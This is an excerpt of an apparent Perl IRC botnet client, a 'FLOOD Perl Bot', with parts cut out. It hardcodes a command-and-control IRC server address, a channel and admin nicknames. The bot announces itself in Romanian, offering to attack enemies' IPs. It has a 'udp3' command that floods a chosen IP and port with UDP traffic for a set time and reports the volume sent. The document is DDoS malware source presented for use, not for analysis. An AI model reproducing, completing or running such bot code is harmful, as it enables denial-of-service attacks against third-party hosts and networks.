...
## my @nickname = ("frankfurd");
## my $nick =$nickname[rand scalar @nickname];

my $nick =$rircname[rand scalar @rircname];

$server = '80.211.40.30' unless $server;
my $port = '6667';
...
my @admins = ("Hun","Kinderuu","frankfurd2","frankfurd3");
my @hostauth = ("sethost");
my @channels = ("#hun");
...
sub parse {
  ...
  foreach my $canal (@channels) {
	sendraw("MODE $nick +x");
    sendraw("JOIN $canal");
	sendraw("PRIVMSG $canal :4,1 [FLOOD Perl Bot] 9,1 -> SaLooT SiLE Cyber ! # #BoT-Joined. -> Hai sa facem LEGO IP-urile inamicilor. ");
}
}
}
...
if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    ...
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 FLOOD] 9,1trimitem mare somnifer la IP -> 12".$1." 9,1bomba trimisa pe port-ul 12".$porta." 9,1pentru 12".$dtime." 9,1seconde. ");
	while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 FLOOD] 9,1I-am dat somn total -> 12".$pacotese." 9,1Kb in 12".$dtime." 9,1 ->  12".$1."9,1. ");
}
##############
